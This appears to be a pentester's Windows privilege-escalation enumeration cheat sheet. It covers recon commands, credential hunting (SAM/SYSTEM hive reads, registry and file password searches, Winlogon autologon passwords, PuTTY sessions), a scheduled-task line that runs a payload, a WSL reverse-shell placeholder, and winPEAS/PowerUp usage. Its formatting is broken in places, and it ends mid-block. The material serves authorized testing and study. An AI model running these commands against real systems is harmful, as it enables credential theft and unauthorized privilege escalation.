**1.1 System Information & Configuration:**

- **What to look for:** OS version, architecture, patch level, user context, privileges, environment variables, Windows version, Antivirus enumeration, and any unusual configurations.
- **Why it's important:** This data will guide your exploit selection (kernel exploits, unpatched vulnerabilities), identify user-specific weaknesses, and reveal potential attack vectors like weak permissions on sensitive files.
- **Commands:**


```powershell
systeminfo                                          # OS version, build info, patches, arch
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  # OS Name and Version quickly
whoami                                              # Current user
whoami /groups                                      # Current user's groups
whoami /priv                                        # Current user's privileges.
    # Look for: SeImpersonatePrivilege, SeAssignPrimaryToken, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege
hostname                                            # Local computer name
echo %username%                                     # Current user (env variable)
echo %userdomain%                                   # Domain name (env variable)
[environment]::Is64BitOperatingSystem              # Check if OS is 64-bit
[environment]::Is64BitProcess                       # Check if process is 64-bit
set                                                 # List environment variables. Look for unusual entries, credentials.
$ExecutionContext.SessionState.LanguageMode        # PowerShell language mode
Get-Clipboard                                       # View clipboard contents
wmic qfe get Caption,Description,HotFixID,InstalledOn # Lists installed hotfixes
Get-HotFix                                          # Alternate way to see OS updates/hotfixes
[System.Environment]::OSVersion.Version              # Returns current OS version
Get-MpComputerStatus                                # Check Windows Defender status
Get-MpPreference | Select-Object -Property ExclusionPath # Check if there's an exclusion path
```


**1.2 Network Information:**

- **What to look for:** Network interfaces, IP addresses, DNS servers, routing table, open ports, established connections, and mounted drives/shares.
    
- **Why it's important:** Helps map the network, identify potential targets for lateral movement, discover internal services, and find shared resources that might contain sensitive data.

```
ipconfig /all                                       # Network adapter settings (IPs, DNS, DHCP)
ipconfig /displaydns                                # View DNS cache (potential internal hostnames)
arp -a                                              # ARP table (potential other targets)
route print                                         # Routing table
netstat -ano                                        # Open connections and listening ports with PIDs
netstat -ano | findstr LISTENING                    # Filter for listening ports
netsh advfirewall show allprofiles                 # Current firewall profiles/config (status, ports, apps)
net use                                             # Mounted drives
net share                                           # Shared resources
net session                                         # Current network sessions (Requires admin privileges)
```


**1.3 User and Group Information:**

- **What to look for:** Local and domain users, group memberships, especially users in the Administrators group or other privileged groups.
    
- **Why it's important:** Identifies potential target accounts for privilege escalation and lateral movement (e.g., accounts with weak passwords or belonging to powerful groups).

```
net user                                            # List local users
net user [username]                                 # Details about a specific user
net user /domain                                    # List domain users (if on a domain)
net localgroup                                      # List local groups
net localgroup administrators                       # List users in the Administrators group
net group /domain                                    # List domain groups (if on a domain)
net group "Domain Admins" /domain                   # List users in the Domain Admins group (if on a domain)
net group "Domain Controllers" /domain               # List domain controllers (if on a domain)
Get-LocalUser                                       # List of users
Get-LocalGroup                                      # List of groups
Get-LocalGroupMember Users                          # Members of a specific group
```

**1.4 Process and Application Information:**

- **What to look for:** Running processes, associated services, installed applications, startup programs, and their corresponding executable paths and command-line arguments.
    
- **Why it's important:** Reveals potential vulnerabilities in running services or applications (e.g., unquoted service paths, weak permissions), identifies targets for DLL hijacking, and uncovers custom or unusual applications that might have security weaknesses.
```
Get-Process                                         # Lists running processes
tasklist                                            # Lists running processes
tasklist /svc                                       # Lists running processes with associated services (find service PIDs)
    # Investigate: smss.exe, csrss.exe, winlogon.exe, LSASS, svchost.exe
wmic process get name,executablepath,commandline    # Processes with command line arguments (more details)
net start                                           # List running services
sc query state= all                                 # Detailed service information (status, paths, etc.)
wmic product get name,version                        # Installed programs
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # Installed programs (x64)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # Installed programs (x86)
wmic startup get caption,command                    # Startup programs
```

**1.5 Scheduled Tasks:**

- **What to look for:** Scheduled tasks, especially those running with elevated privileges, and the associated scripts or executables.
    
- **Why it's important:** Misconfigured scheduled tasks can be exploited to run malicious code with higher privileges.

```
schtasks /query /fo LIST /v                         # List scheduled tasks with details (user, command, schedule)
# Monitor Scheduled tasks (log changes):
$logFile = "C:\Users\Documents\scheduled_tasks_watch.txt" # Sets variable for log file path
while ($true) {                                     # Loop that runs indefinitely
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss" # Gets the current date and time
    Get-ScheduledTask | Where-Object {$_.State -eq 'Running'} | ForEach-Object { # Retrieves running scheduled tasks
        "$timestamp - TaskName: $($_.TaskName), State: $($_.State)" | Tee-Object -FilePath $logFile -Append # Logs task information and appends to log file
    }
    Start-Sleep -Seconds 2 # Pauses the loop for 2 seconds
}
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State # Alternate method to list tasks
at 08:00 /interactive “C:\Windows\temp\Payload.exe” # Create a scheduled task which will execute malicious code.
```


**1.6 Registry:**

- **What to look for:** Stored credentials (e.g., PuTTY sessions), configuration settings (e.g., `AlwaysInstallElevated`), and weak permissions on registry keys related to services or autoruns.
    
- **Why it's important:** The registry can contain sensitive information or misconfigurations that can be leveraged for privilege escalation.

```
reg query HKCU\Software /s /f "PuTTY"                 # Recursively search for putty keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s # Query PuTTY sessions
Get-ItemProperty -Path 'HKCU:\Software' -Name '*PuTTY*' -ErrorAction SilentlyContinue # Get PuTTY related registry items
Get-Acl "HKLM:\System\CurrentControlSet\Services\regsvc" | Format-List # Get ACL for a specific registry key
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Check AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  # Check AlwaysInstallElevated
reg query HKLM /f password /t REG_SZ /s # Search registry for keys and values containing "password" in HKLM
reg query HKCU /f password /t REG_SZ /s # Search registry for keys and values containing "password" in HKCU
```


**.7 File System & Sensitive Data:**

- **What to look for:** Configuration files, scripts, password databases, sensitive documents, backup files, and files with weak permissions. Common locations include user directories, temporary directories, web server roots, and old Windows installations. Also check for default writeable folders.
    
- **Why it's important:** These files might contain credentials, sensitive information, or reveal details about the system's configuration that can be used for further attacks.
-
General File & Directory Discovery:
```powershell
# Basic file searches 
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* ## Find sensitive named files
where /R C:\ user.txt ## Find user.txt anywhere
where /R C:\ *.ini ## Find all ini files
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk,*.bak,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue ## Find common file types

# Specific file searches
Get-ChildItem -Path C:\ -Filter "unattended.xml","index.html","default.html","home.html","backup","OMLs.db3" -Recurse -File -ErrorAction SilentlyContinue ## Find specific files
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue ## Search user directories
Get-ChildItem -Path C:\Windows.old\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue ## Search old Windows files

# Shortcut analysis
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt ## Find shortcuts
ForEach($file in gc.\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas } ## Check for elevated shortcuts

# Special locations
$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value; cd "C:\$Recycle.bin\$sid" ## Access Recycle Bin
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "SAM" } ## Find SAM file
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk -File -Recurse -ErrorAction SilentlyContinue ## Find KeePass and PuTTY keys
dir /s *pass* == *.config* ## Find password and config files
```

Web Server Specific Files & Directories:

```powershell
# IIS files
Get-ChildItem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue ## IIS configs
dir /b /s web.config ## Find all web.config

# Apache/Nginx files
Get-ChildItem -Path C:\xampp\htdocs -Include *.php,*.html,*.js,*.conf,*.inc,.htaccess -File -Recurse -ErrorAction SilentlyContinue ## Apache files
Get-ChildItem -Path C:\nginx\html -Include *.php,*.html,*.js,*.conf,*.inc -File -Recurse -ErrorAction SilentlyContinue ## Nginx files

# Connection strings
findstr /si connectionstring *.xml ## Find connection strings
```

Windows System Files
```powershell
# SAM and System files
Get-Content "$env:SystemRoot\repair\SAM" -ErrorAction SilentlyContinue ## SAM backup
Get-Content "$env:SystemRoot\System32\config\RegBack\SAM" -ErrorAction SilentlyContinue ## SAM backup
Get-Content "$env:SystemRoot\System32\config\SAM" -ErrorAction SilentlyContinue ## Current SAM
Get-Content "$env:SystemRoot\repair\system" -ErrorAction SilentlyContinue ## System backup
Get-Content "$env:SystemRoot\System32\config\SYSTEM" -ErrorAction SilentlyContinue ## Current system
Get-Content "$env:SystemRoot\System32\config\RegBack\system" -ErrorAction SilentlyContinue ## System backup

# Log files
Get-Content "$env:windir\debug\NetSetup.log" -ErrorAction SilentlyContinue ## Setup logs
Get-Content "$env:windir\iis6.log" -ErrorAction SilentlyContinue ## IIS logs
Get-Content "$env:windir\system32\config\AppEvent.Evt" -ErrorAction SilentlyContinue ## App logs
Get-Content "$env:windir\system32\config\SecEvent.Evt" -ErrorAction SilentlyContinue ## Security logs
Get-ChildItem "$env:windir\System32\CCM\logs\*.log" -ErrorAction SilentlyContinue ## SCCM logs

# User and config files
Get-Content "$env:USERPROFILE\ntuser.dat" -ErrorAction SilentlyContinue ## User registry
Get-Content "$env:windir\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue ## Hosts file
dir c:*vnc.ini /s /b ## VNC configs
dir c:*ultravnc.ini /s /b ## UltraVNC configs
```

PowerShell Analysis
	Look for: command history, transcripts, and hidden data streams

```powershell 
# History and transcripts
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue ## PS history
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include PowerShell_transcript* -Recurse -ErrorAction SilentlyContinue ## Find transcripts

# Alternate data streams
Get-Item -path * -Stream * | Where-Object Stream -ne ':$Data' ## Check alternate streams
```

Credential Hunting
	Look for: passwords, connection strings, and API keys in files
```powershell
# General password search
findstr /si /m "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.pem *.key > password_results.txt ## Find passwords

# Pattern matching
$patterns = 'api_key','secret_key','client_secret','token','apikey','encrypted_','bearer','connectionstring' ## Common patterns
foreach ($pattern in $patterns) { Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern $pattern -ErrorAction SilentlyContinue } ## Search patterns
```

Registry Analysis (Annotated):
HKLM = System wide, HKCU = currently logged in user, HKCR = COM object registration, HKCC = hardware profile
```powershell
# General password search
REG QUERY HKLM /F "password" /t REG_SZ /S /K ## Find passwords in HKLM
REG QUERY HKCU /F "password" /t REG_SZ /S /K ## Find passwords in HKCU
REG QUERY HKCR /F "password" /t REG_SZ /S /K ## Find passwords in HKCR

# Winlogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" ## Check WinLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" ## Check default creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword ## Check autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v AltDefaultPassword ## Check alt autologon

# Service credentials
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" ## Check SNMP
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" ## Check PuTTY

# Stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Credentials" ## Check stored creds
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Credentials" ## Check user creds
reg query "HKCU\Software\Microsoft\Remote Desktop Connection Manager" /v UsernameForSavePassword ## Check RDP

# Startup entries
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ## Check autoruns
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ## Check one-time autoruns

# HKCR checks (file associations and COM objects)
reg query "HKCR\CLSID\{GUID}\LocalServer32" /s ## Check COM object paths
reg query "HKCR" /f ".exe" /k ## Find executable file associations
reg query "HKCR" /f "*.dll" /s ## Find DLL registrations
Get-ItemProperty Registry::HKCR\* | Where-Object { $_.DeviceType -eq "DelayedAutostart" } ## Find delayed autostart services

# HKCC checks (hardware profile)
reg query "HKEY_CURRENT_CONFIG\System\CurrentControlSet\Services" ## Check service configurations
reg query "HKEY_CURRENT_CONFIG\Software" ## Check software configurations
```

Permission Analysis
```powershell 
accesschk.exe -uwqs "Authenticated Users" * ## Check weak permissions
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" ## Check startup folder
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | Where-Object {$_.AccessToString -match "Everyone\s+Allow\s+\bWrite\b|BUILTIN\\Users\s+Allow\s+\bWrite\b"} ## Check Program Files
```


```


**1.8 AppLocker Status:**

- **What to look for:** AppLocker rules.
- **Why it's important:** Helps determine if you need to bypass application whitelisting and identify potential weaknesses in these security controls.

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # List Applocker rules
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone # Test Applocker rules
```

**1.9 Windows Subsystem for Linux (WSL):**

- **What to look for:** Check for Windows Subsystem for Linux
- **Why it's important:** Can be used to get a bind/reverse shell.
- **Commands:**

```
wsl python -c ‘BIND_OR_REVERSE_SHELL_PYTHON_CODE’ # Check if Windows Subsystem for Linux is enabled in the machine, if so this can be exploited to get a bind/reverse shell.
```


1.10 Automated Enumeration Tools

```

.\Seatbelt.exe all                                  # Run all checks
.\Seatbelt.exe -group=all -full > output.txt        # Run all checks, full output to file
.\Seatbelt.exe NonStandardServices                  # Check for non-standard services
.\Seatbelt.exe NonStandardProcesses                 # Check for non-standard processes


winPeas.exe userinfo                                # Gather user information
winPeas.exe systeminfo                              # Gather system information
winPeas.exe processesinfo                           # Gather process information
winPeas.exe servicesinfo                            # Gather service information
winPeas.exe applicationsinfo                        # Gather application information
winPeas.exe networkinfo                             # Gather network information
winPeas.exe windowscreds                           # Gather Windows credentials
winPeas.exe browserinfo                             # Gather browser information
.\winpeas.exe                                       # Run all checks

**PowerUp:** PowerShell-based enumeration and exploitation.

Import-Module .\PowerUp.ps1                          # Import the PowerUp module
Invoke-AllChecks                                     # Run all checks
Get-ServiceUnquoted                                 # Find unquoted service paths
Get-ServiceFilePermission                           # Find services with weak file permissions
Get-ModifiableService                               # Find modifiable services
Test-ServiceDaclPermission                          # Test
```